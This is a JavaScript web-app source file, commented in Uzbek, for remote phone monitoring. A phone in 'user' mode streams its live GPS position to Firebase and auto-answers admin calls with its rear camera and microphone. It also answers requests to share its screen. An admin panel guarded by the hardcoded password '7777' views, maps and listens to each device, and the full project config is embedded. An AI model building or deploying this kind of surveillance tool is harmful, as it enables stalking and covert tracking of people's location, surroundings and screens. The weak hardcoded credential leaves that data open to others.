// 1. FIREBASE KONFIGURATSIYASI
const firebaseConfig = {
    apiKey: "AIzaSyBhzWWFFgrOH84J2RIW5o7l_8192iPtbOg",
    authDomain: "code-vibe-df610.firebaseapp.com",
    projectId: "code-vibe-df610",
    databaseURL: "https://code-vibe-df610-default-rtdb.firebaseio.com",
    storageBucket: "code-vibe-df610.firebasestorage.app",
    messagingSenderId: "747762490655",
    appId: "1:747762490655:web:125516814620784cf3a42a",
    measurementId: "G-3QE6F8LWZ1"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const adminPass = "7777";

let peer = null;
let adminPeer = null;
let localStream = null;
let currentActiveCallId = null;
let isTalking = false;
let map = null;
let marker = null;

// SAHIFA YUKLANGANDA
window.onload = () => {
    const role = localStorage.getItem('myRTC_role');
    const name = localStorage.getItem('myRTC_deviceName');
    if (role === 'user' && name) startUserLogic(name);
    else if (role === 'admin') openAdmin(true);
};

function goHome() {
    if (confirm("Chiqishni xohlaysizmi?")) {
        localStorage.clear();
        window.location.reload();
    }
}

// QURILMA MODELINI TO'G'RI ANIQLASH (Sizda 'aas' chiqmasligi uchun)
function getDetailedModel() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) {
        const match = ua.match(/\(([^;]+);([^;]+);/);
        return match ? match[2].trim() : "Android_Phone";
    }
    return (ua.indexOf("Linux") !== -1) ? "Linux_PC" : "Device";
}

// --- USER MODE (TELEFON UCHUN) ---
async function openUser() {
    let name = prompt("Ismingizni kiriting:");
    if (!name) return;
    name = name + "(" + getDetailedModel() + ")";
    localStorage.setItem('myRTC_role', 'user');
    localStorage.setItem('myRTC_deviceName', name);
    startUserLogic(name);
}

async function startUserLogic(deviceName) {
    document.getElementById('main-ui').style.display = 'none';
    peer = new Peer();

    peer.on('open', (id) => {
        const ref = db.ref('devices/' + id);
        ref.set({ name: deviceName, status: 'online' });
        ref.onDisconnect().remove();

        // GPS va Batareya (Sizda bular to'g'ri ishlayapti)
        navigator.geolocation.watchPosition(p => {
            db.ref('devices/' + id + '/location').set({
                lat: p.coords.latitude, lng: p.coords.longitude, time: new Date().toLocaleTimeString()
            });
        }, null, { enableHighAccuracy: true });
    });

    try {
        // MUHIM: Mobil telefonda kamera va mikrofonga ruxsat olish
        localStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "environment" }, // Orqa kamera
            audio: true 
        });

        peer.on('call', async (call) => {
            // Agar admin ekran so'rasa
            if (call.metadata && call.metadata.type === 'getScreen') {
                try {
                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    call.answer(screenStream);
                } catch (e) { console.error("Ekran ruxsati berilmadi"); }
            } else {
                // Kamera va ovoz qo'ng'irog'iga javob berish
                call.answer(localStream);
                call.on('stream', (remoteStream) => {
                    // Admin ovozini eshitish uchun (Speaker)
                    const audio = new Audio();
                    audio.srcObject = remoteStream;
                    audio.play().catch(e => console.log("Ovoz avto-play bloklandi"));
                });
            }
        });

        document.body.innerHTML = '<div style="background:white; height:100vh; display:flex; align-items:center; justify-content:center;"><h1>KUZATUV YOQILDI</h1><button onclick="goHome()" style="position:fixed; top:20px; left:20px; padding:10px;">Chiqish</button></div>';
    } catch (e) { alert("Kamera/Mikrofon ruxsati berilmadi!"); }
}

// --- ADMIN MODE (KOMPYUTER UCHUN) ---
function openAdmin(auto = false) {
    if (!auto && prompt("Parol:") !== adminPass) return;
    localStorage.setItem('myRTC_role', 'admin');
    document.getElementById('main-ui').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'block';
    document.getElementById('top-nav').style.display = 'flex';

    if (!adminPeer) adminPeer = new Peer();

    db.ref('devices').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const btn = document.createElement('button');
            btn.innerText = child.val().name;
            btn.onclick = () => connectToDevice(child.key, child.val().name);
            list.appendChild(btn);
        });
    });
}

function connectToDevice(id, name) {
    if (currentActiveCallId) {
        db.ref('devices/' + currentActiveCallId + '/info').off();
        db.ref('devices/' + currentActiveCallId + '/location').off();
    }
    currentActiveCallId = id;
    document.getElementById('target-name').innerText = "Qurilma: " + name;

    // Batareya va GPS yangilash (Sizning kodingizdan olindi)
    db.ref('devices/' + id + '/info').on('value', s => {
        const i = s.val();
        if (i) document.getElementById('battery-display').innerText = `Quvvat: ${i.battery} ${i.charging ? '(⚡)' : ''}`;
    });

    db.ref('devices/' + id + '/location').on('value', s => {
        const l = s.val();
        if (l) {
            document.getElementById('location-display').innerText = `Kordinata: ${l.lat}, ${l.lng} (${l.time})`;
            initLeafletMap(l.lat, l.lng); // index.html dagi Leaflet ishlatiladi
        }
    });

    // KAMERANI KO'RISH
    const videoCall = adminPeer.call(id, null);
    videoCall.on('stream', s => {
        document.getElementById('remoteVideo').srcObject = s;
    });

    // EKRANNI KO'RISH (3-oyna uchun so'rov)
    const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
    screenCall.on('stream', s => {
        const screenVideo = document.getElementById('screenVideo') || document.getElementsByClassName('placeholder-text')[0];
        if (screenVideo.tagName === 'VIDEO') {
            screenVideo.srcObject = s;
        } else {
            // Agar video elementi bo'lmasa, o'rniga dinamik yaratamiz
            screenVideo.innerHTML = '<video id="screenVideo" autoplay playsinline style="width:100%; height:100%;"></video>';
            document.getElementById('screenVideo').srcObject = s;
        }
    });
}

function initLeafletMap(lat, lng) {
    if (!map) {
        map = L.map('map').setView([lat, lng], 16);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        marker = L.marker([lat, lng]).addTo(map);
    } else { marker.setLatLng([lat, lng]); map.setView([lat, lng]); }
}

async function toggleTalk() {
    const btn = document.getElementById('talkBtn');
    if (!isTalking) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            adminPeer.call(currentActiveCallId, stream);
            isTalking = true; btn.innerText = "GAPIRILMOQDA..."; btn.style.background = "red";
        } catch (e) { alert("Mikrofon xatosi!"); }
    } else {
        window.location.reload(); // Oddiyroq yo'li
    }
}
